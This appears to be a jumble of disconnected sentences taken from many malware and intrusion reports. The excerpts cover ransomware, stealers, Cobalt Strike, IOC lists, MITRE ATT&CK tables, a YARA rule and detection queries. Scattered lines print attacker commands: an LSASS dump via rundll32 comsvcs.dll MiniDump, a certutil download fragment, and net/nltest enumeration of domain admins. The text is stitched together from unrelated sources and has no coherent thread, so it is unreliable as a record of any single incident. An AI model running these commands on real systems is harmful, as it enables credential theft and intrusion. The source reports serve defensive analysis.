FlagDescription-u<username>:<password> for login for hivecust*.onion domain to identify victim-da<domainname>\<username>:<password> use different credentials when doing network spreading.
Enumerates running processes Enumerates IDs from Steam application Enumerates files under Steam application directory Gets a list of installed browsers by looping through entries under registry key SOFTWARE\\Clients\\StartMenuInternet and SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet, and then recording the contents of subkey shell\\open\\command for each. 
Credential Access Incident #1 Minidump of LSASS process memory leveraging comsvcs.dll with proxy execution by rundll32.exe. 
What's New? Cisco Talos discovered a malicious campaign using an obfuscated Meterpreter stager to deploy Cobalt Strike beacons in September 2021.
Figure 8: Inspector tool provided by PyPI security team 
Monitor for user accounts logged into systems associated with RDP (ex: Windows EID 4624 Logon Type 10).
This file is an obfuscated .NET file using process hollowing, which is a code injection technique in which an attacker removes legitimate code from an executable and replaces it with malicious code. 
SMB beacons are mostly used to make network detection harder and to get access to isolated systems where communication to the internet is prohibited.
Named pipes were created in order to establish communication between CS processes: In this particular case, threat actors used default post-exploitation jobs, which have a pattern of postex_[0-9a-f]{4}. 
[+] FILE COMPRESSED SIZE: 183734 [+] FILE ORIGINAL PATH:
It executes WSReset.exe to trigger this protocol. 
During this time, cyberattacks are often more effective as security and other personnel take this time off. 
BinaryID string 0xa 0x7 Username unicode 0x11 0x2 Username length 0x13 0x4 Username string 0x17 0x12 Hostname unicode 0x29 0x2 Hostname length 0x2b 0x4 Hostname string 0x2f 0x16 Domain hostname unicode 0x45 0x2 Domain hostname length 0x47 0x4 Domain hostname string 0x4b 0x16 Screen width 0x61 0x4 
Platform(s) Detection Name Network Security Email Security Detection On Demand Malware Analysis File Protect Backdoor.
SentinelLabs continues to monitor espionage activities and hopes that defenders will leverage the findings presented in this post to bolster their defenses. 
Data from Local System
Within the communications of the bot, there is an authentication header which contains the bot’s project ID, some other details and the version of the bot. 
Originally designed as a banking Trojan to steal financial data, TrickBot has evolved into highly modular, multi-stage malware that provides its operators a full suite of tools to conduct a myriad of illegal cyber activities. 
The MacOS version used a hard coded C2 domain.
Table of Contents LockBit 2.0 OverviewVictimologyLeak Site DataUnit 42 Incident Response Data on LockBit 2.0LockBit 2.0 Tactics, Techniques and ProceduresLockBit 2.0 Technical DetailsLockBit 3.0Courses of ActionConclusionAppendix AAdditional Resources LockBit 2.0 Overview LockBit 2.0 is another example of RaaS that leverages double extortion techniques as part of the attack to pressure victims into paying the ransom. 
Table 1: Measurable Events Measurable Event Description MITRE ATT&CK Technique(s) Expected Detection Points Expected Network Defender Reactions Reported Reactions Internal Port Scan Launch scan from inside the network from a previously gained workstation to enumerate ports on target workstation, server, and domain controller system(s). 
Little is still known about this group with motivations appearing to be for reputation, money and “for the lulz”. 
Install updated builds to ensure affected VMware Horizon and UAG systems are updated to the latest version. 
DNS floods are considered relatively modern, made widely possible by the increasing numbers of IoT devices worldwide.
title: New Horabot campaign targets the Americas url: https://blog.talosintelligence.com/new-horabot-targets-americas/ Cisco Talos has observed a threat actor deploying a previously unidentified botnet program Talos is calling “Horabot,” which delivers a known banking trojan and spam tool onto victim machines in a campaign that has been ongoing since at least November 2020.The threat actor appears to be targeting Spanish-speaking users in the Americas and, based on our analysis, may be located in Brazil.
When EXCEPTION_BREAKPOINT exception is raised, handler perform following steps: 
Let’s take a look at a sample with MD5 5598febfbf00839c9f7047d9fe3205e3. 
Note: For Windows 8, this is enabled by default.
This technique allows the group to remain undetected and avoid detection by traditional security measures. 
It clears the trash before the ransomware starts encrypting files.
0x801530, 0x801630, 0x801730, 0x8018A0 Uninstall the Trojan. 
While the group’s original focus has been on telecommunication providers, recent reports suggest that Gallium has recently expanded targeting across other sectors. 
All Team.
To facilitate the communication with modules, the main module starts by creating a pipe with a randomly generated name formatted using the following format string: {%08X-%04X-%04X-%04X-%08X%04X} 
Chrome/57.0.2987.133 Safari/537.36 Other Persistence Activities WMI activity [T1546.003] was also observed to execute commands on the systems. 
Detects the presence of debuggers through APIs IsDebuggerPresent, and OutputDebugStringW, and checks for system breakpoints.
3CXDesktopApp Backdoored in a Suspected Lazarus Campaign  
The websites and installers downloaded from them are mostly in Chinese and in some cases falsely offer Chinese language versions of software that is not available in China. 
[T1055.012] Exploitation for Privilege Escalation
Keylogging In its IRP_MJ_READ handlers for keyboard and mouse events, the driver simply records IO events to lookaside lists before passing them to the legitimate handler.
Anti debugging API Fig.
Ultimately, there seems to be considerable effort going into the future of IcedID and the malware’s codebase, including the addition of two new variants described in this report.
CrowdStrike recommends the following best practices for internal information repositories: Enable detailed access logging Ensure logs are centralized and stored for at least 180 days Create detections for anomalous activity such as access from an unusual location like a server subnet Enable MFA on the repository site, or provide access via Single Sign On (SSO) behind MFA O365 Built-in Service Principal Hijacking The threat actor connected via Remote Desktop from a Domain Controller to a vCenter server and opened a PowerShell console, then used the PowerShell command -ep bypass to circumvent the execution policy.
To this end, AddSecurityPackage64.dll issues an RPC call to LSASS – to the ncalrpc:[lsasspirpc] RPC endpoint, providing the file path to pc.dll to LSASS.
Domain Account T1136.002 
While many organizations are now focusing more on perimeter defenses and two-factor authentication after recent public examples of password reuse or VPN appliance exploitation, monitoring on endpoints is often overlooked or left to traditional antivirus.
Note: Those files will still get executed, if the user clicks on run! 
Also it uses same instructions multiple times in shellcode to make it hard for reverser to perform static and dynamic analysis and to consume lot of time. 
The malware is a DLL that is launched using rundll32.exe: “C:\Windows\perfc.dat”,#1 18
FROM Win32_ComputerSystem SELECT *
The other entries are used to identify the backdoor and the victimized host: 
In cybersecurity, a bot can refer to any computing device, for example, a laptop, workstation, or internet of things (IoT) device infected with malware and under a threat actor’s control.
Overview In April 2022, CISA conducted retrospective analysis using EINSTEIN—an FCEB-wide intrusion detection system (IDS) operated and monitored by CISA—and identified suspected APT activity on an FCEB organization’s network.
S0495 RDAT
ariopolanetyoa[.]com ProjectID: 3278418257 Standard IcedID Bot Configuration: C2:
T1543.003 Create or Modify System Process: Windows Service Adversary launched backdoor and some tools as a Windows Service including adding of registry keys T1546.003 Event-Triggered Execution: WMI Event Subscription WMI was used for running commands on remote systems T1053.005 Scheduled task Adversary ran scheduled tasks for persistence of certain malware samples T1078 Valid accounts Using Mimikatz and dumping of lsass, the adversary gained credentials in the network T1020 Automated exfiltration The PlugX malware exfiltrated data towards a C2 and received commands to gather more information about the victim’s compromised host. T1030 Data transfer size limits Adversary limited the size of rar files for exfiltration T1070.004 Indicator removal on host Where in the beginning of the campaign the adversary was sloppy, during the last months of activity they became more careful and started to remove evidence T1041 Exfiltration over C2 channel Adversary used several C2 domains to interact with compromised hosts. 
[T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.
ShellExecuteA is also used to launch various Windows binaries (bcdedit.exe, notepad.exe, vssadmin.exe, wbadmin.exe, wmic.exe) for destruction of backups and ransom note display purposes.
When opened in a Windows environment the following is displayed: The ISO mounts as a DVD Drive.
Access to necessary services and ports should be restricted, where feasible.
The calculated master secret is 48 bytes in length.
SaaS / Admin / OAuth Permission Grant SaaS / Compromise / Unusual Logic Following OAuth Grant SaaS / Admin / New Application Service
The ID field contains a unique value generated by the backdoor for the target system. 
Figure 1: A screenshot of the recent phishing email used to deliver Gh0st RAT via an embedded link.
T1036.004Masquerading: Masquerade Task or ServiceThe driver component of FlowCloud masquerades as a mouse driver service. 
They do not use branding, which is relatively rare in ransomware operations. 
The service name is a random eight characters and different strings were observed across different systems. 
Machine ID: black-dog MAC Address: 08:00:27:c6:74:5d MAC Vendor: PCS SYSTEMTECHNIK Creation: 2022-05-12 15:33:49 Execution Once the PowerShell script from the LNK file executed successfully
Upon execution, the malware immediately begins to look for EDR and antivirus software. 
However since the latter technology has not yet been implemented on Windows, in this blog post we are going to refer to “Intel CET” as the implementation with only Shadow Stack enabled. 
nicknamec[.]com BazarLoader C2 Domain (Employment Termination Malspam) 3c27fca6d9cf1379eee93e6fea339e61 BazarLoader Shellcode Injector (Preview15-10.exe) 3ee60e0efeb5b349a5ba7325ce4a33dc BazarLoader Shellcode Injector (Document2-85.exe) hxxps://docs[.]google[.]com/document/d/e/2PACX- 1vR_9tGGWDcS1ZyIuiGpMQg2Sv9nRWempyUKuQ1iyJp_HHt1C87OPirnO7EImnOW6ILbrmHXUpl_OIxQ/p Employment Termination Malspam Payload URL hxxps://docs[.]google[.]com/document/d/e/2PACX- 1vQ7wK9C0fLCwS3voYLhGz3Gmy6g4UMKe_xZ1ds8xv7LonpviJBXefG9rBZuMPkmtytDYe_5rbDztBnK/pub Survey Malspam Payload URL ds45x1[.]com BazarLoader C2 Domain (Survey Malspam) ds46x1[.]com BazarLoader C2 Domain (Survey Malspam) ds47x1[.]com BazarLoader C2 Domain (Survey Malspam) marcene[.]jack[at]peytoneley[.]com BazarLoader Malspam Email shannon[.]ong35[at]myhunter[.]cuny[.]edu BazarLoader Malspam BazarLoader Malspam Email bessie[.]wilson[at]griply[.]com BazarLoader Malspam Email Lilly Chalupowski Paul Neuman 
[T1548.002] Cortex XDR Prevent Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Enable Anti-Malware Protection Defense Evasion 
Our examination of the infrastructure led us to other findings that indicate the actors’ interest in Taiwan’s government entities as well. 
This obfuscated process is not required for the ransomware encryption logic, which suggests it was developed to bypass security solutions monitoring direct API calls. 
There are also similarities in the ransom message, including: Their claim that all “documents, databases, backups, and other critical” files and data were encrypted AES as their choice of cryptographic algorithm Their statement that “the price depends on how soon you will contact us” Tools and Techniques Unit 42 has seen evidence of malicious activity associated with Trigona originating from a compromised Windows 2003 server, followed by the threat operators executing NetScan for internal reconnaissance. 
That paper describes a Lazarus cyberespionage campaign targeting defense and aerospace companies.
Further steps and recommendation to manage, design, and secure your Azure AD environment can be found by referring to Azure Identity Management and access control security best practices. 
so they know how to spot them. 
Then we show our attempts, unfruitful as they were, at discovering a link between NetWalker and previous, seemingly unrelated ransomware variants.
Check out McAfee Insights to stay on top of NetWalker’s latest developments and intelligence on other cyber threats, all curated by the McAfee ATR team.
According to our investigation, although there are low numbers of victims related to the exploit, the said detections do not appear related to ViperSoftX victims. 
The most recent distribution of Zerobot includes additional capabilities, such as exploiting vulnerabilities in Apache and Apache Spark (CVE-2021-42013 and CVE-2022-33891 respectively), and new DDoS attack capabilities. 
S0232 HOMEFRY
We discuss other possible affiliations, as well as victim profiles and behaviors in our Spotlight feature on the ransomware group. 
- In Autodiscover at FrontEnd select tab URL Rewrite, select Request Blocking - Add string “.*autodiscover\.json.*\@.*Powershell.
This is a classic BlueNoroff strategy to persuade the victim to execute the malicious shortcut file to acquire the decoy document’s password.
title: SYS01 Stealer Will Steal Your Facebook Info url: https://blog.morphisec.com/sys01stealer-facebook-info-stealer Starting in November 2022, Morphisec has been tracking an advanced info stealer we have named “SYS01 stealer.”
Basic steps to help prevent SYS01 stealer include implementing a zero-trust policy and limiting users’ rights to download and install programs.
McAfee’s Advanced Threat Research team has analysed the NetWalker ransomware and have been following its evolution from the initial sighting of the Mailto ransomware to its redevelopment into the NetWalker ransomware.
Attempts to Access SBS 2 Conducting open-source research, the team identified an organizational branch [T1591] that likely had access to SBS 2.
Still, the creator of this malicious document could have easily replicated the technique from the publicly available PoC linked in the blog.
On the other hand, the indentation, script tasks, and file naming are different.
This site has been regularly updated with new victims since the initial discovery of the group. 
Creating the listening port (TCP port 8888) 
Credential Theft Using Get-ADReplAccount 
[MITRE ATT&CK] Rootkit (T1014) |
title: Bee-Ware of Trigona, An Emerging Ransomware Strain url: https://unit42.paloaltonetworks.com/trigona-ransomware-update/ This post is also available in: 日本語 (Japanese)Executive Summary Trigona ransomware is a relatively new strain that security researchers first discovered in late October 2022.
Data read by resume.exe has been added to the end of the PDF file.
Three years ago, we were investigating an infection of a cryptocurrency company located in Southeast Asia.
This is achieved by locating the process that hosts the Event Log, enumerating the processes’ threads, identifying the threads assigned to the service by their service tag (eventlog), and terminating them. 
NSIS script for one of the droppers; the malicious files are highlighted The files Bonehead (encrypted RAT) and ShoonCataclysm.dll (dropper DLL) are written in the same folder and the DLL is run with rundll32.exe using Uboats as its argument.
One of them – named GetMicInfo – contains an algorithm designed to gather database passwords by decrypting them from Windows registry values.
When opened, the user sees a social engineering image telling them that they must click the “Enable editing” button to see the document’s contents. 
G0024 Putter Panda
Figure 11.
TLD in 2017 and 2018, but they started using sub-domains under the parent domain appspot.com and azureedge.net in 2019.
During this time, Windows event logs point to the threat actors completing DCSync activities on one of the domain controllers.
Temporary containment measures GTSC's direct incident response process recorded more than 1 organizations being the victims of an attack campaign exploiting this 0-day vulnerability.
Compressed size (4 bytes) 6. Offset 0x4e: Uncompressed size (4 bytes) 7. Offset 0x52: Loader configuration string length (2 bytes) 8. Offset 0x154: Start of encrypted and compressed loader configuration and payload After decrypting and decompressing the payload, we see a pipe-delimited configuration followed by the actual shellcode to be executed (Figure 9). 
In a few cases, we had a tougher time bruteforcing the key at first.
“cmd” /c cd /d "c:\\PerfLogs"&certutil.exe -urlcache -split -f
HorabotSpamTool-10003092-0IOCsIndicators of Compromise associated with this threat can be found here. 
The noticeable spikes in spring and fall give us a hint at some of their motivations.
We observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host. 
In June 2022, the gang targeted other victims with encrypted files appended with the extension “.fargo.”
As a summary of the execution process: Figure 9.
In reflective PE injection, the PE file is parsed and its sections are reconstructed in the target process’s memory.
[T1082], Network Service Discovery [T1046], Permission Groups Discovery [T1069] Next-Generation Firewalls Ensure that all zones have Zone Protection Profiles with all Reconnaissance Protection settings enabled, tuned, and set to appropriate actions Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Cortex XSOAR Deploy XSOAR Playbook - Port Scan Lateral Movement 
An encrypted file’s structure The ransomware then renames the encrypted files by appending them with the “.royal” extension, as demonstrated in Figures 14 and 15. Figure 14.
destination.ip destination.port tls.client.ja3 tls.server.ja3s zeek.ssl.server.name Count 5.196.103.145 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc choifejuce[.]lol 373 5.196.103.145 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc erinindiaka[.]quest 1 46.101.19.119 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc opiransiuera[.]com 278 178.128.85.30 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc zoomersoidfor[.]com 4 5.252.177.10 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc considerf[.]info 1 66.63.188.70 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc antiflamez[.]bar 1 155.138.159.45 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc www[.]onlinecloud[.]cloud 1 IcedID C2 beaconing over the intrusion: Cobalt Strike There were a number of beacons deployed across the environment, over 70 pipes were created.
Role Id | project Timestamp, AccountObjectId,AccountDisplayName, AppId = RawEventData.ModifiedProperties[0].NewValue, AppName = RawEventData.
Encrypted Channel:
The decoded PowerShell instructions are below:This PowerShell is responsible for the performing the following tasks:Disabling PowerShell logging.
Hex is read (after being copied from c:\windows\system32\Sysurl.
Prevent local DNS servers from answering internet-based DNS queries — unless our DNS nameserver is registered with ICANN.DoS/DDoS/floodingDNS flooding is an attack by which malicious actors try to overwhelm DNS servers with false DNS requests to prevent them from serving legitimate requests.
We continue monitoring this group and malware family for updates on possible variations of C&C communication protocols being abused. 
See figure 2 for a timeline of the team’s post exploitation activity that includes key points of access. 
In June of 2022, we observed a threat actor gaining access to an environment via Emotet and operating over a eight day period.
In multiple StellarParticle-related cases, because the threat actor used the same set of accounts during their operations in the environment, CrowdStrike was able to identify previous malicious activity going back multiple years, based solely on UAL data.
Note that some fields are commented out. 
The following figure emphasizes the complexity of the evasive techniques that are implemented in the Crypter. Figure 5: Low detection rate on VT The Installer Once downloaded and executed, the malicious installer copies its compressed files into a newly created folder with a legitimate-looking name (i.e., IIS Application Health Monitor) in one of the following directory paths: C:\Users\<user>\AppData\Roaming\C:\Users\<user>\AppData\Local\ The malicious files are copied along with many other open-source or free application-related files.
Contents Higaisa shortcuts Attribution Crosswalk Loaders and injectors Injectors Local shellcode loaders Attack examples An encrypted resume I can't breathe Chat transcript Attacks on Russian game developers Unity3D Game Developer from St. Petersburg HFS with a surprise A purloined certificate FunnySwitch Unpacking Funny.dll Transport protocols Network-level protocol Application-level protocol Supported commands Unused code FunnySwitch vs. Crosswalk ShadowPad PlugX Paranoid PlugX Conclusion PT products detection names PT Sandbox PT Network Attack Discovery Applications Known names of files from which PL shellcode may be loaded IOCs MITRE 1.
This information, if leveraged by an opportunistic threat actor, criminal, or nation-state, could prove to be damaging to Ecuadors national security.
It primarily focuses on South Korea, but other Asian countries also have been targeted.
Reduce the attack surface by limiting the use of legitimate administrative pathways and tools such as PowerShell, PSExec, and WMI, which are often used by malicious actors.
Ensure that User-ID is only enabled for internal trusted interfaces CORTEX XSOAR Deploy XSOAR Playbook – Access Investigation Playbook Deploy XSOAR Playbook – Block Account Generic Deploy XSOAR Playbook – Impossible Traveler CORTEX XDR PREVENT Configure Host Firewall Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Malware Protection Credential Access The below courses of action mitigate the following techniques: Credentials from Password Stores [T1555] CORTEX XDR Cortex XDR monitors for behavioral events and files associated with credential access and exfiltration Discovery 
S0369 CoinTicker
Pass the Hash Dumps password hashes for use in pass the hash authentication attacks. T1021.001.
BITS Jobs Uses BITSAdmin to download and install payloads. 
/null 2>&1;APP_MACH="$TMPDIR/MacOS/Logic Pro X";rm
[D3-SFA] Process Analysis File Access Pattern Analysis
Figure 17: REvil ransom note Example 2 – Loading Gootkit In an other common variant, the payload is saved as Base64.
Create alerts for Windows event log authentication codes, especially for the domain controllers.
As far as Proofpoint researchers can tell, this string is not used and serves no purpose.
This function is responsible to allocate and execute Layer 2 shellcode. 
Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter –ignore-existing from two different hosts on the network.
S0646 SpicyOmelette
Windows Command Shell Uses cmd.exe to execute commands. 
Tax firms targeted by precision malware attacks
As an example, the malware can: Capture keystrokes Change the victim’s screen resolution Terminate browser processes and steal or delete their stored data.
• Monitor scheduled task creation from common utilities using command-line invocation and compare for any changes that do not correlate with known software, patch cycles, or other administrative activity. 
See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK:registered: tactics and techniques with corresponding mitigation and/or detection recommendations. 
Application object provides methods for working with the Windows shell. 
Mshta [T1218.005] Signed Binary Proxy Execution: Rundll32
StopRansomware Royal Ransomware
The trojan has several anti-analysis and anti-virtual machine (VM) techniques built-in to avoid analysis in automated sandboxes and to thwart debugging:
Note, however, that these alerts may also be triggered by unrelated threat activity.
up to date to protect your computer from new variants of malware.
[TA0008] from Workstation 2 to the Site 1 SharePoint server and had SYSTEM level access to the Site 1 SharePoint server, which had Unconstrained Delegation enabled.
Conclusion Winnti has an extensive arsenal of malware, as can be seen from the group's attacks.
The full config extraction, detailing the Malleable C2 profile, is available in Command and Control section. 
| where not(base64_decoded has_any(@"software\checker", "set folder to watch")) | where base64_decoded has_all("$hst", "$prt") or base64_decoded has_any("watcher", @"WAt`CH`Er()") 
Figure 7.
CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7 Threat Prevention Persistence Modify Registry key – Create own key (T1112) 
Impact of Ransomware Loss of Valuable data. 
Consent phishing attacks aim to trick users into granting permissions to malicious OAuth apps to gain access to user’s legitimate cloud services (mail servers, files storage, management APIs, etc.).
S1105 COATHANGER
Contrary to those previously found, the samples we obtained for version
Syncro RMM can also be used as a persistence mechanism MITRE ATT&CK Tactic Defense Evasion ID T1562.001 MITRE ATT&CK Technique Impair Defenses:
Instead, visitors were served a page from a Django application listing a variety of commands (see Figure 5). 
The PowerShell downloader script will download a ZIP file that contains the payload DLLs and a few legitimate executables and DLLs.
N/A Stage Capabilities [T1608] Obtain Capabilities
But for many security teams, even at large companies, you may not have the time to manually unpack and reverse engineer files on a regular basis.
The identical encrypted file was also downloaded from http://114.55.109[.]199:56022/SL3716/S8437AEB.DAT by a FlowCloud dropper version 4.1.3 (SHA‑1: 014421BDB1EA105A6DF0C27FC114819FF3637704).
Webpage: Telework Guidance CISA Webpage: VPN-Related Guidance FBI Private Industry Notification: PIN 20200409-001 References [1] CyberScoop:
The attachment appears as shipping document that is awaiting to be opened, read through, and approved by the target.
Analysts from TrendMicro have published an analysis of the ransomware. 
Defense EvasionT1134.002Access Token Manipulation: Create Process with TokenSimplexTea can create a new process, if instructed by its C&C server. 
= "" ] && kill "$PID" >
New Horabot campaign targets the Americas
Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.
If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. 
Microsoft has recently released a security patch for PrintNightmare — we encourage all enterprises to patch immediately to avoid exploitation.
Around two hours after dropping the file, it was executed using a command line argument, which included a list of hosts to target.
Once establishing the RDP connection, they deployed Powertool64.exe, likely to prevent intervention by any security tools and launched the software Don’t Sleep. 
Recipients are typically individuals affiliated with high-profile think tanks or universities in Israel, North America, or Europe with ties to the security and policy communities.
Countries affected include Costa Rica, Peru, Mexico, Ecuador, Brazil, and Argentina, among others, all of which have publicly condemned Russia for invading Ukraine at the United Nations General Assembly (UNGA).
This is the only difference between the two LNK files.
This allowed CrowdStrike to demonstrate that a given user account was also authenticating to Active Directory from a given source IP address two years prior.
The COOP payload base address is then dereferenced into RAX which points to the first vfgadget that gets called.
The post cited law enforcement pressure and pressure from the United States for this decision. 
In order to make them directly, the authors of the malware switch to the 64-bit mode first: using a technique called “Heaven’s Gate”. 
The team used these platforms to create flexible and dynamic redirect servers to send traffic to the team’s Cobalt Strike servers [T1090.002].
â¨M2â© â G2Initially, we restrict our message length to be 12 bits, such that the individual message chunks M1 and M2 are 6 bits each.
This module allows the injection of a PE file into a remote or local process’s memory without writing it to disk, but being a well-known and widely-used tool, it has gained significant attention from security vendors and technologies, including the Antimalware Scan Interface (AMSI). 
Credential Access Technique Title ID Use OS Credential Dumping: LSASS Memory T1003.001 
For a full list of security content, check out the release notes on Splunk Docs. 
A newly identified utility dubbed FJORDOHELPER can update FOCUSFJORD configurations and completely remove FOCUSFJORD from the system.
This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC.
The bait is notable for the topic: the hackers were attempting to exploit U.S. protests related to the death of George Floyd.
Self-defined format in the file with the .z extension generated by NUPAKAGE Table 5.
-m nuitka --standalone --onefile maccaronic2_server.py Our newly generate PE file is ready to go.
The request’s body is composed of this encoded value prefixed with the hardcoded string id=1&op=report&status=. Client request and server response templates are shown in Figure 21 and Figure 22 respectively, with the template fields in angle brackets. 
Multiple new versions and variations of GlobeImposter have appeared in the years since.
The RSA-encrypted AES key and IV will be appended on each encrypted file (Figure 10). 
S0136 USBStealer
User data was encrypted, after which a ransom demand was made.
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin = “0” Kill Processes/Services After bypassing UAC, the ransomware terminates several processes, including 360doctor, GDscan, RTVscan, Apache, CCleaner, OneDrive, and others, if they are currently running on the victim’s machine. 
System Network Configuration Discovery
Secure credentials by restricting where accounts and credentials can be used and by using local device credential protection features. 
Service Stop T1497 Virtualization/Sandbox Evasion T1497.001 Virtualization/Sandbox Evasion: System Checks T1505.003 Server Software Component: Web Shell T1518 Software Discovery T1543.003 Create or Modify System Process: Windows Service T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1553.002 Subvert Trust Controls: Code Signing T1559.002 Inter-Process Communication: Dynamic Data Exchange T1560 
S0516 SoreFang
Naturally, if you are a website owner using this plugin and haven’t yet already, patch now!
This serves as a means of transporting the target’s address to the fake Google Docs site, which enables the site to dynamically display the address, creating a personalized and convincing appearance of legitimacy.
CLFS and Transaction Files PRIVATELOG and STASHLOG rely on the Common Log File System (CLFS) to hide a second stage payload in registry transaction files. 
Consider its use suspicious and investigate, especially if average users run scripts. 
*/ import "pe" rule llJyMIOvft_14335 { meta: description = "llJyMIOvft.dll" author = "The DFIR Report" reference = "https://thedfirreport.com" date = 2022-09-12" hash1 = "2b2e00ed89ce6898b9e58168488e72869f8e09f98fecb052143e15e98e5da9df" strings: $s1 = "Project1.dll" fullword ascii $s2 = "!>v:\"6;" fullword ascii $s3 = "y6./XoFz_6fw%r:6*" fullword ascii $s4 = "u3!RuF%OR_O*^$nw7&<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">" fullword ascii $s5 = "*/B+ n" fullword ascii $s6 = "ZnwFY66" fullword ascii $s7 = "1!f%G%w" fullword ascii $s8 = "QKMaXCL6" fullword ascii $s9 = "IMaRlh9" fullword ascii $s10 = "_BZRDe'7&7<<!{nBLU" fullword ascii $s11 = "lw7\"668!qZNL_EIS7IiMa" fullword ascii $s12 = "IS6\\JMtdHh0Piw2/PuH" fullword ascii $s13 = "iw#!RuF%OR__*^$nw76668!qZNL_EYS7I" fullword ascii $s14 = ".RuF%LR__*^$" fullword ascii $s15 = "^<_EHJ3IPLPeZX0Phg7!BAK%_" fullword ascii $s16 = "ilG8Rn\"2OIkY*E%zw'v669(pZGn_EH_6IE" fullword ascii $s17 = "ilg7Rnr0OI^]*JTnw6\"76<" fullword ascii $s18 = "Broken pipe" fullword ascii /*
The shellcode looks for 0x4d 0x5a and 0x50 0x45 bytes that denote the “MZ" and “PE” headers of a Windows PE executable file to locate the payload in memory.
AtomBombing Injection Technique AtomBombing is a technique that allows malware to inject code while avoiding calling suspicious APIs that security vendors are watching.
It has been historically associated with malicious activity performed by threat actors, APT groups (like in this Mandiant report from 2017), or government attacks (in this report by Unit42 in 2017). 
Threat actors use this technique to steal the victim’s sensitive data or plant malware — like ransomware or keyloggers — on their victim’s device.
S0449 Maze
applicationThe adversary was also observed remotely modifying the Windows Registry on remote systems to disable remote administration restrictions to facilitate lateral movement and privilege escalation activities.
[T1568.002] Non-Standard Port [T1571] Protocol Tunneling [T1572] Encrypted Channel:
LockBit 2.0 has been observed changing infected computers’ backgrounds to a ransomware note.
.rar 
When we compared Rorschach to other well-known ransomware families, we noticed that Rorschach uses a variety of time-honored methods together with some novel ideas in the ransomware industry.
The name of the VBScript files varied across engagements and was generally designed to look fairly innocuous and blend in.
The malware also accepts commands from a Telegram channel, though these commands may vary between variants. 
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 968 C:\ProgramData\REDACTED\lsass.dmp full ProcDump Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS, and deleted them from the ProgramData folder: 
This just opens up new possibilities for evading detection, when using Python to develop malware. 
Figure 1 Using the URLhaus dataset, we can also learn that RedLine Stealer abuses several known legitimate file/code sharing and collaboration platforms for its campaigns.
Review the traffic destination domain, which may be malicious and an indicator of compromise. 
Below is an example of how a threat actor performs credential hopping: Gain access to the victim’s network by logging into a public-facing system via Secure Shell (SSH) using a local account <user sftp> acquired during previous credential theft activities. 
Attackers commonly leverage botnets, especially on IoT devices, to generate spoofed DNS requests to overwhelm the target servers or organization network with DNS responses.
Next, we find an XOR loop that decrypts this configuration. 
Win32.CobaltStrike Backdoor.
This article will demonstrate how to detect this communication before threat actors accomplish their objectives.
This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address.
Once that was accomplished, the suspicious and malicious functionality was easy to see. 
The threat actor chose CIDR block scanning as a way to get access to a wide range of target hosts on different IPs within a network instead of using a single IP address as a target. 
This occurred as part of multiple spam campaigns that also included 7zip archives and followed the execution flow previously described. 
For instance, Chrome saves the credentials in the SQLite format on the disk which can be decrypted using DPAPI as discussed earlier sections.
The risk of negative publicity and stigmatization on dark web and special-access forums, mainstream media attention, and international law enforcement activity increases dramatically once targets in these industries are attacked.
To generate the jar a simple way without needing a manifest is thew following javac .\HelloWorld.java jar cfe app.jar HelloWorld HelloWorld.class PoC By chaining all together, we get a nice simple flow here. 
Azureedge.net is a parent domain owned by Microsoft, and part of Microsoft’s Azure content delivery network. 
By using the variable “dec_list” to contain the decimal to be converted, and the variable “key” representing the string found at the end of decimal, we decoded the function. 
The threat actors stayed dormant for most of this time, before jumping into action on an early Saturday morning.
Sandals passing to Fantasy the same RSAParameters object as was used by Apostle ransomware Conclusion Since its discovery in 2021, Agrius has been solely focused on destructive operations.
The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources). 
Reflectively loads and launches the Orchestrator. 
As shown in Figure 6, threat actors use multi-layered AES encryption and base64 encoding to obfuscate “co.ps1”.
The IDR team has successfully blocked over 550 thousand BazarLoader malspam emails throughout this campaign alone. 
<REMOTE_IP> Permission Groups Discovery As we have already observed in multiple cases, the threat actors enumerated the local administrators group and domain privileged (Enterprise and DAs) administrators groups mainly using net command: net use net group "Domain computers" /dom net group "Enterprise admins" /domain net group "domain admins" /domain net localgroup administrators nltest /dclist: nltest /domain_trusts ping -n 1 <REMOTE_IP> 
We found changes in the configuration file, such as the disappearance of the contact “mail” and “crmask” fields (previously set as XXX@cock.li,XXX@tuta.io, etc., and .mailto[email].{ID}).
As we’ll soon discover, the vulnerable application will take care of these offsets once we have submitted the parameters from the command line. 
Based on the event logs within a modified version of Cobalt Strike, analysts have determined with high confidence that Mandarin was set as the default language.
